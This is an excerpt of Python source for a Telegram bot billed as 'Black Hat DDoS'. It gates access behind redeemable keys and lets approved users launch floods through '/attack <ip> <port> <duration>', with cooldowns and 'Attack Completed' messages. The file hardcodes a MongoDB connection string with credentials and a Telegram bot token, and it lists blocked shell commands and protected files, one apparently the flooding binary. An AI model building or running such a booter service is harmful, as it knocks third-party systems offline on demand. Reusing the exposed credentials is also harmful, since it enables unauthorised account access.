...
MONGO_URI = 'mongodb+srv://black:hat@cluster0.rwpkrlr.mongodb.net/BLACK?retryWrites=true&w=majority&appName=Cluster0'
...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7512318354:AAEuiH66Jrm35hMFQfL1xV7dNnbzvnkONck'
...
PROTECTED_FILES = ["D.py", "bgmi"]
BLOCKED_COMMANDS = ['vim', 'shutdown', 'reboot', 'rm', 'mv', 'dd']
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*🔥 Welcome to the Black Hat DDoS! 🔥*\n\n*☣️ Status: ❌ Not Approved*\n*🎟️ Redeem a valid key for again!*\n\n*🤖 Try for run this command: /help*", parse_mode='Markdown')
        return

    message = (
        "*🔥 Welcome to the Black Hat DDoS! 🔥*\n\n"
        "*☣️ Status: 🟢 Approved*\n"
...
async def attack(update: Update, context: CallbackContext):
    ...
    if last_attack_time:
        ...
        if elapsed_time < COOLDOWN_PERIOD:
            ...
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"*⏳ Please wait {remaining_time.seconds // 10} minute(s) and {remaining_time.seconds % 60} second(s) before using /attack again.*", 
                parse_mode='Markdown'
            )
            return
    ...
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid command format. Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return
...
async def run_attack(chat_id, attack_command, context):
    try:
        ...
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*\n*Your cooldown ended. You can run another attack*", parse_mode='Markdown')
